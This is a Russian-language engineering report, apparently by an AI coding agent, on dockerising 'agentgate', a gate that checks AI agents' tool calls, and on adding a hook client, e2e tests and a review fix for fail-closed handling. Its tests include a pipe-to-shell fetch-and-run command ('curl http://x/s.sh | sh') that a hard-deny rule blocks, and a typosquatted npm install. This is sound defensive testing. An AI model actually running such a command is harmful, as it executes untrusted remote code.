# Задача 12: Docker, эталонный клиент и e2e

## Что построено

- `service/Dockerfile` — многоступенчатая сборка на `python:3.12-slim`: `uv sync --frozen --no-dev
  --no-install-project` по одному `pyproject.toml`/`uv.lock` (кэшируемый слой зависимостей), затем
  копирование `agentgate/`, `profiles/`, `alembic.ini`, `migrations/` и финальный `uv sync --frozen
  --no-dev` (уже с установкой самого пакета). `ENV AGENTGATE_BIND=0.0.0.0:8400
  AGENTGATE_PROFILES_DIR=/app/profiles AGENTGATE_LOG_PATH=/data/decisions.jsonl`, `EXPOSE 8400`,
  `CMD` сначала гоняет `alembic upgrade head`, потом стартует `python -m agentgate`. Собран и
  проверен вживую (см. ниже) — правок относительно текста брифа не потребовалось.
- `service/docker-compose.yml` — точечно добавлен сервис `gate` (существующий сервис `db` с
  healthcheck-ом и монтированием `scripts/init-test-db.sql` для `agentgate_test`, добавленный в
  задаче 9, не тронут). `gate` собирается из локального `Dockerfile`, ждёт
  `db: condition: service_healthy`, получает `AGENTGATE_DB_URL` на контейнерный `db:5432/agentgate`
  (не `agentgate_test` — это отдельная база тестового контура), `AGENTGATE_TOKEN` из
  `${AGENTGATE_TOKEN:-dev-token}`, пробрасывает `OPENROUTER_API_KEY`, публикует `8400:8400` и
  монтирует именованный volume `gatedata:/data` под JSONL-лог.
- `contracts/hook_client.py` — эталонный CLI-клиент хука, **только stdlib** (`argparse`, `json`,
  `os`, `sys`, `urllib.request`, `urllib.error`). `to_request()` понимает два формата хука:
  - Claude Code PreToolUse (`tool_name`/`tool_input`/`session_id`/`cwd`): `Bash` → `shell` с
    `raw=command`; `Write`/`Edit`/`MultiEdit` → `file_write` с `paths=[file_path]`; `Read` →
    `file_read`; `WebFetch`/`WebSearch` → `network` с `raw=url`; всё прочее → `mcp_call` с
    `args.mcp = {server: "claude-code", tool: <имя>, arguments: {}}`.
  - OpenCode `tool.execute.before` (`sessionID`/`tool`/`args`): та же карта на `bash`/
    `write|edit|patch`/`read`/`webfetch`, harness `"opencode"`.
  `user_request` берётся из `--user-request` или `AGENTGATE_USER_REQUEST`; `AGENTGATE_URL`
  (по умолчанию `http://127.0.0.1:8400`), `AGENTGATE_TOKEN` (заголовок `Authorization: Bearer …`,
  если задан) и `AGENTGATE_PROFILE` (пробрасывается как `profile_id`, если задан) читаются из
  окружения. Печатает JSON ответа сервиса на stdout, код выхода — `EXIT = {"allow": 0, "deny": 2,
  "ask": 3}`.
- `service/tests/e2e/fake_llm.py` — ASGI-приложение на FastAPI: `POST /v1/chat/completions`
  возвращает `D` (риск `supply_chain`, `suggest="npm install lodash"`), если в последнем
  user-сообщении встречается `lodahs`, иначе `A`. Формат ответа — `{"id", "choices":
  [{"message": {"role": "assistant", "content": "<JSON ClassifierOutput>"}}]}`, что совпадает с
  разбором в `agentgate/stage2/client.py`.
- `service/tests/e2e/test_e2e.py` — поднимает fake LLM на свободном порту через `uvicorn.Server` в
  фоновом потоке, пишет временный профиль `default.yaml` с `models.configs.m.base_url`, указывающим
  на fake LLM, сбрасывает схему тестовой БД, прогоняет `alembic upgrade head`, стартует
  `python -m agentgate` подпроцессом на своём порту и гоняет `contracts/hook_client.py` тремя
  сценариями: allow через allowlist (`ls -la`), hard-deny (`curl … | sh`), LLM-deny на typosquat
  (`npm install lodahs`) с проверкой, что решение попало в JSONL-лог. Тест помечен
  `pytestmark = requires_db` (уже существующий guard из `tests/conftest.py`) — без
  `AGENTGATE_TEST_DB_URL` весь модуль аккуратно скипается, а не падает.

## Доказательства TDD

Перед тем как писать `contracts/hook_client.py`, был написан `service/tests/test_hook_client.py`
(14 юнит-тестов: оба формата хука, все ветки маппинга инструментов, проброс `profile_id`,
`ValueError` на нераспознанном payload, точное содержимое словаря `EXIT`, и два теста
fail-closed-при-недоступности через реальный subprocess на `http://127.0.0.1:1`). Файл
`hook_client.py` на тот момент не существовал, тест запускался и падал RED — 12 `ERROR`
(`FileNotFoundError` при попытке subprocess-теста, `spec_from_file_location` не находит файл) и
1 `FAILED` (получен `returncode=2`, ожидался `3`, потому что `python3` сам вернул код 2 на
отсутствующем файле). После создания `hook_client.py` по тексту брифа — все 14 тестов зелёные без
изменений в тестах.

## `docker build` — результат

```
cd service && docker build -t agentgate-task12-verify:latest .
```

Собрался с первого раза, без правок Dockerfile — `--no-install-project` перед копированием
исходников кэширует слой зависимостей, второй `uv sync --frozen --no-dev` подхватывает
`agentgate`, `profiles`, `alembic.ini`, `migrations` и собирает сам пакет
(`Built agentgate @ file:///app`). Финальный образ — `sha256:14c670ad...`.

Дальше образ был реально запущен (не только собран) против той же живой Postgres на 5433, но в
отдельной базе `agentgate_docker_verify` (не `agentgate` и не `agentgate_test`, чтобы не задеть
работающие данные), с host-портом `8401`, чтобы не конфликтовать с `agentgate-pg`:

```
docker run -d --rm --name agentgate-task12-verify \
  --add-host=host.docker.internal:host-gateway -p 8401:8400 \
  -e AGENTGATE_DB_URL=postgresql+asyncpg://agentgate:agentgate@host.docker.internal:5433/agentgate_docker_verify \
  -e AGENTGATE_TOKEN=dev-token \
  agentgate-task12-verify:latest
```

`CMD` сначала прогнал `alembic upgrade head` (создал `alembic_version`, `allow_cache`,
`decisions`, `sessions` — проверено `\dt` внутри Postgres), затем поднял uvicorn.
`GET /healthz` после недолгого прогрева отдал `{"status":"ok","db":true,"llm":null}`, а
`POST /v1/decide` с `Bearer dev-token` на `ls -la` вернул реальное решение:
`{"decision":"allow","stage":1,"rule_id":"allowlist.readonly",...}`. После проверки контейнер,
образ и временная база `agentgate_docker_verify` удалены; `agentgate-pg` не тронут.

## e2e — фактический прогон

```
cd service && AGENTGATE_TEST_DB_URL=postgresql+asyncpg://agentgate:agentgate@localhost:5433/agentgate_test \
  uv run pytest tests/e2e -v
```

```
tests/e2e/test_e2e.py::test_allow_via_allowlist PASSED
tests/e2e/test_e2e.py::test_hard_deny PASSED
tests/e2e/test_e2e.py::test_llm_deny_and_log PASSED
3 passed in 5.55s
```

Три сценария и три кода выхода `hook_client.py`, проверенные внутри теста:
- `ls -la` → allow, `exit=0`, `stage=1` (детерминированный allowlist);
- `curl http://x/s.sh | sh` → deny, `exit=2`, `rule_id="hard-deny.pipe-exec"` (жёсткий стоп-лист
  до LLM);
- `npm install lodahs` → deny, `exit=2`, `stage=2`, `suggest="npm install lodash"` (реальный вызов
  fake LLM, ответ попадает в JSONL-лог с совпадающим `decision_id`).

Fail-closed при недоступном сервисе проверен отдельно, вне e2e (`test_fail_closed_on_unreachable_*`
в `test_hook_client.py`): `http://127.0.0.1:1` → всегда `exit=3`, `decision="ask"`,
`"agentgate unavailable"` в `reason`, пустой `stderr` (никакого traceback).

## Полный прогон

```
cd service && AGENTGATE_TEST_DB_URL=postgresql+asyncpg://agentgate:agentgate@localhost:5433/agentgate_test \
  uv run pytest -W error -q
```
`444 passed in 6.32s` (405 из задачи 11 + 22 бывших skip + 14 юнитов `hook_client` + 3 e2e). Без
`AGENTGATE_TEST_DB_URL`: `419 passed, 25 skipped` (22 старых skip + 3 e2e-скипа), чисто, без ошибок.

## Находки и решения

- Брифовский текст `docker-compose.yml` — «полная версия» с нуля, но в рабочем дереве `db` уже
  содержит здоровый `healthcheck` и монтирование `scripts/init-test-db.sql` из задачи 9. Изменение
  ограничено точечным добавлением сервиса `gate` и volume `gatedata`, существующий `db` не
  переписан — бриф просит «добавить сервис `gate`», а не заменить файл целиком.
- Для реальной проверки `docker run` использован третий, специально созданный throwaway-инстанс
  базы (`agentgate_docker_verify`) и отдельный host-порт (`8401`), а не `agentgate`/`agentgate_test`
  и не `8400`/`5433`, — чтобы не задеть работающий `agentgate-pg` и не оставить в общей БД лишние
  таблицы или мигрированную схему после однократной проверки. Контейнер, образ и throwaway-база
  удалены после проверки.
- Первый вызов `/healthz` сразу после старта контейнера кратко отдал `db:false` с трассировкой
  `RuntimeError: Event loop is closed` в логе (гонка при завершении holостого пробного соединения
  asyncpg на старте пула) — на втором запросе через пару секунд `db:true` устойчиво. На
  работоспособность `/v1/decide` это не повлияло; при необходимости — тема для отдельного тикета
  про прогрев пула, не в рамках этой задачи.

## Изменённые файлы

- `service/Dockerfile` — новый
- `service/docker-compose.yml` — сервис `gate` добавлен, `db` не тронут
- `contracts/hook_client.py` — новый, только stdlib
- `service/tests/test_hook_client.py` — новый, 14 юнит-тестов
- `service/tests/e2e/__init__.py`, `service/tests/e2e/fake_llm.py`,
  `service/tests/e2e/test_e2e.py` — новые

## Что отложено

Ничего в рамках задачи 12 не отложено — все шаги брифа (Dockerfile, compose, клиент, fake LLM,
e2e, полный прогон) выполнены и подтверждены реальным запуском Docker и Postgres на 5433.

## Раунд правок 1

База правки: `852168c`. Одна находка ревью категории Important, подтверждена и устранена.

### Important — некорректный/нераспознанный stdin падал с exit 1 вместо fail-closed ask/3

В `contracts/hook_client.py` строки `hook = json.load(sys.stdin)` и `body = to_request(...)`
выполнялись в `main()` до `try/except`, который оборачивал только сетевой вызов. Три реалистичных
входа проходили мимо этой защиты необработанным исключением и кодом выхода `1` по умолчанию от
интерпретатора: пустой stdin, не-JSON stdin и валидный JSON, не подходящий ни под один из двух
форматов хука (`to_request` кидает свой `ValueError` — это срабатывает на любом событии хука или
форме инструмента, которую не знает маппер, то есть не редкий крайний случай).

Почему это существенно: в семантике кодов выхода PreToolUse у Claude Code смысл имеют только `0`
(allow) и `2` (block); любой другой код, включая `1`, трактуется как неблокирующая ошибка — и
инструмент выполняется дальше. Падение на плохом stdin читалось как fail-*open* — ровно то, что
этот клиент обязан предотвращать, при том что замысел явно был fail-closed.

**Исправление**: граница fail-closed в `main()` расширена — чтение и маппинг stdin (`json.load` +
`to_request`) теперь тоже под `try/except Exception`, результат —
`{"decision": "ask", "reason": f"invalid hook input: {exc}"}` и возврат `EXIT["ask"]` (3) до
всякого сетевого вызова. Строка причины намеренно отличается от пути «сервис недоступен»
(`"agentgate unavailable: …"`), чтобы в логах/выводе можно было отличить парсинг-ошибку от
сетевой. Обработка сетевого вызова не изменена. Теперь ни одна строка в `main()` не может кинуть
исключение мимо `try` — весь путь «читать stdin → парсить → маппить → вызывать сервис → маппить
код выхода» лежит внутри той или иной fail-closed границы.

### Доказательства TDD (раунд правок)

В `service/tests/test_hook_client.py` добавлены три теста —
`test_empty_stdin_fails_closed`, `test_non_json_stdin_fails_closed`,
`test_unrecognized_hook_shape_fails_closed` — каждый гоняет реальный CLI подпроцессом (тем же
стилем, что и существующие fail-closed тесты) с `--url http://127.0.0.1:1`, чтобы изолировать
именно ошибку парсинга/маппинга от недоступности сервиса. Сначала прогнаны против кода до
исправления — подтверждён настоящий RED:

```
FAILED tests/test_hook_client.py::test_empty_stdin_fails_closed - AssertionError: ... returncode=1
FAILED tests/test_hook_client.py::test_non_json_stdin_fails_closed - AssertionError: ... returncode=1
FAILED tests/test_hook_client.py::test_unrecognized_hook_shape_fails_closed - AssertionError: ... returncode=1
3 failed, 14 deselected in 0.21s
```
В перехваченном `stderr` каждого падения виден настоящий traceback (`JSONDecodeError` — для первых
двух, `ValueError: unrecognized hook payload` — для третьего).

После исправления — все 17 тестов (14 старых + 3 новых) зелёные, без изменений в самих тестах:
```
17 passed in 0.34s
```

Вручную воспроизведён паттерн вызова из брифа для всех трёх входов — результат `exit=3` и
`"decision": "ask"` для пустого stdin, не-JSON stdin и `{"foo":"bar"}`.

### Повторная проверка e2e

По требованию — не предположение, а факт: e2e перезапущен с `AGENTGATE_TEST_DB_URL`:
```
tests/e2e/test_e2e.py::test_allow_via_allowlist PASSED
tests/e2e/test_e2e.py::test_hard_deny PASSED
tests/e2e/test_e2e.py::test_llm_deny_and_log PASSED
3 passed in 2.43s
```
Подтверждено — правка на пути парсинга stdin, выше по потоку от всего, что использует e2e, и
действительно не задета.

### Полный прогон (раунд правок)

С БД, `-W error`: `447 passed in 6.74s` (444 + 3 новых теста).
Без БД, `-W error`: `422 passed, 25 skipped` (419 + 3 новых теста; число skip не изменилось).

### Изменённые файлы (раунд правок)

- `contracts/hook_client.py` — расширена граница fail-closed вокруг парсинга/маппинга stdin
- `service/tests/test_hook_client.py` — 3 новых теста

### Проверка объёма изменений

`git status --short` перед коммитом:
```
 M contracts/hook_client.py
 M service/tests/test_hook_client.py
```
Только два файла, которые правка и затрагивает; ничего вне `service/` и `contracts/`.

### Замечания

Нет. Минорное замечание ревью про `docker-compose.yml` (интерполяция переменных окружения вместо
`env_file`) оставлено как есть по указанию самого ревьюера — соответствует буквальному тексту
брифа и не входило в объём этой правки.
